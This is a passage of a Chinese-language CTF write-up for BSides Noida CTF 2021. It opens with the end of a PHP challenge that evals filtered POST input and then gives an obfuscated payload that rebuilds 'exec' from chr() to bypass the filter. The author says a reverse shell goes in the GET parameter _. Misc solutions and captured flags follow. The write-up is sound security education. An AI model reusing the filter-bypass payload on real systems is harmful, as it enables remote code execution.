class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;🐶&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/[a-zA-BD-Z!@#%^&amp;*:&#x27;\&quot;|`~\\\\]|3|5|6|9/&quot;</span>,<span class="variable">$payload</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- ?🐶 --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;VietNam&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$VN</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;VietNam&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (filter(<span class="variable">$VN</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!is_string(<span class="variable">$VN</span>) || strlen(<span class="variable">$VN</span>) &gt; <span class="number">110</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;18cm30p ??? =)))&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$VN</span> = <span class="string">&quot;echo &quot;</span>.<span class="variable">$VN</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$VN</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;check&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此時就相當於構造一個字母和部分數字的限定長度的 shell，先用 check 引數看一眼 disable_functions。發現 chr 函式和 exec 函式仍然在，因此只需要利用 exec 去進行 RCE，chr 進行被禁用的字元生成即可。構造出如下載荷。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=C,<span class="variable">$C</span>=((<span class="number">1</span>/<span class="number">0</span>).C)[<span class="number">2</span>],<span class="variable">$C</span>++,<span class="variable">$C</span>++,<span class="variable">$_</span>.=<span class="variable">$C</span>,<span class="variable">$_</span>.=([].C)[<span class="number">2</span>],<span class="variable">$C</span>=<span class="variable">$_</span>(<span class="number">70</span>-<span class="number">1</span>),(<span class="variable">$C</span>.<span class="variable">$_</span>(<span class="number">120</span>).<span class="variable">$C</span>.C)($&#123;_.<span class="variable">$_</span>(<span class="number">71</span>).<span class="variable">$C</span>.<span class="variable">$_</span>(<span class="number">84</span>)&#125;[_]);</span><br></pre></td></tr></table></figure>
+
+<p>載荷將執行 GET 引數 _ 的值，因此將反彈 shell 放在 GET 引數 _ 中，再將載荷以 POST 引數 VietNam 提交即可達成目的。在 shell 中讀取 /home/fl4g_h1hih1i_xxx.txt 即可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;w0w_gr3at_Th4nk_y0u_f0r_j0in1ng_CTF_!!!!!!&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Farewell"><a href="#Farewell" class="headerlink" title="Farewell"></a>Farewell</h3><blockquote>
+<p>“You might be alone at the moment…<br>But someday… You’ll definitely find nakama!<br>No one is born in this world to be alone!”<br>― Eiichiro Oda</p>
+</blockquote>
+<p>拼圖小遊戲，在請求中可以找到原圖，可以直接讀出 flag。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/824f1fae-1c61-4acb-8561-3e2bcd829477/1628504234060552/f5027eccc0e5926c867ad5cce52e6d632ebc7b34.jpg"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;Th4nk5_f0rpl4y1ng_See_y0u_n3xty34rBy3&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Psst"><a href="#Psst" class="headerlink" title="Psst"></a>Psst</h3><blockquote>
+<p>Psst! Want to know a secret? Here, take this…</p>
+</blockquote>
+<p>使用 gzip -d psst.tar.gz 和 tar -xf psst.tar 依次解壓後寫個指令碼進行遍歷。這裡不能使用 Windows 來執行指令碼，因為有資料夾的最後一個字元為 <code>.</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">message = <span class="string">&quot;&quot;</span></span><br><span class="line">path = <span class="string">&quot;./chall/Security&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    files = os.listdir(path)</span><br><span class="line">    <span class="built_in">print</span>(files)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(files) == <span class="number">1</span>:</span><br><span class="line">        flag += <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;path&#125;</span>/<span class="subst">&#123;files[<span class="number">0</span>]&#125;</span>&quot;</span>, <span class="string">&quot;r&quot;</span>).read().strip()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;txt&quot;</span> <span class="keyword">in</span> files[<span class="number">0</span>]:</span><br><span class="line">        files.reverse()</span><br><span class="line">    message += <span class="string">f&quot;<span class="subst">&#123;files[<span class="number">0</span>]&#125;</span> &quot;</span></span><br><span class="line">    flag += <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;path&#125;</span>/<span class="subst">&#123;files[<span class="number">1</span>]&#125;</span>&quot;</span>, <span class="string">&quot;r&quot;</span>).read().strip()</span><br><span class="line">    path += <span class="string">f&quot;/<span class="subst">&#123;files[<span class="number">0</span>]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(message)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<p>執行指令碼後可以得到一段話和 flag。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSides is a community-based framework for organizing events and informing members of the public about information security. These events are already happening in major cities around the world! We are responsible for organizing an independent BSides event approved in Noida, India. It creates opportunities for people to be present and participate in an intimate environment that promotes collaboration. It is a lively event with discussions, demos, and participants&#39; interactions.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;d1d_y0u_u53_b45h_5cr1pt1ng_6f7220737461636b6f766572666c6f773f&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="My-Artwork"><a href="#My-Artwork" class="headerlink" title="My Artwork"></a>My Artwork</h3><blockquote>
+<p>“You can create art and beauty with a computer.” - Steven Levy<br>So, I decided not to use MS Paint anymore and write code instead!<br>Hope you can see my art before the turtle runs away!<br>He’s pretty fast tbh!<br>PS: Put the flag in BSNoida{} wrapper.</p>
+</blockquote>
+<p>將附件下載下來，使用 FMSLogo 逐條指令執行即可得到透過繪畫讀出如下字串。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CODE_IS_BEAUTY_BEAUTY_ISCODE</span><br></pre></td></tr></table></figure>
+
+<p>按照提示將字串包裹即可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;CODE_IS_BEAUTY_BEAUTY_ISCODE&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首頁</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Baby-Web"><span class="toc-number">1.1.</span> <span class="toc-text">Baby Web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Baby-Web-Revenge"><span class="toc-number">1.2.</span> <span class="toc-text">Baby Web Revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wowooo"><span class="toc-number">1.3.</span> <span class="toc-text">wowooo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#freepoint"><span class="toc-number">1.4.</span> <span class="toc-text">freepoint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Calculate"><span class="toc-number">1.5.</span> <span class="toc-text">Calculate</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Farewell"><span class="toc-number">2.1.</span> <span class="toc-text">Farewell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Psst"><span class="toc-number">2.2.</span> <span class="toc-text">Psst</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#My-Artwork"><span class="toc-number">2.3.</span> <span class="toc-text">My Artwork</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/6b16e944.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/6b16e944.html&text=BSides Noida CTF 2021"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/6b16e944.html&title=BSides Noida CTF 2021"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/6b16e944.html&is_video=false&description=BSides Noida CTF 2021"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BSides Noida CTF 2021&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/6b16e944.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/6b16e944.html&title=BSides Noida CTF 2021"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/6b16e944.html&title=BSides Noida CTF 2021"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/6b16e944.html&title=BSides Noida CTF 2021"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/6b16e944.html&title=BSides Noida CTF 2021"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/6b16e944.html&name=BSides Noida CTF 2021&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/6b16e944.html&t=BSides Noida CTF 2021"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 選單</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 文章目錄</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 頁首</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="/zh-CN">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="#">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    
+      <a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/">湘ICP备20002800号</a>
+    
+    
+      <img no-lazy src="/images/beian.png"/>
+      <a href= "http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=43021102000188">湘公网安备43021102000188号</a>
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.3/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdn.bootcdn.net/ajax/libs/clipboard.js/2.0.8/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 2,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(i){i.imageLazyLoadSetting.processImages=a;var n=i.imageLazyLoadSetting.isSPA,o=i.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function a(){n&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,e,a=0;a<r.length;a++)t=r[a],e=void 0,0<=(e=t.getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(i.innerHeight*o||document.documentElement.clientHeight*o)&&function(){var t,e,i,n,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},i=new Image,n=t.getAttribute("data-original"),i.onload=function(){t.src=n,e&&e()},t.src!==n&&(i.src=n)}()}a(),i.addEventListener("scroll",function(){var t,e;t=a,e=i,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+</html>
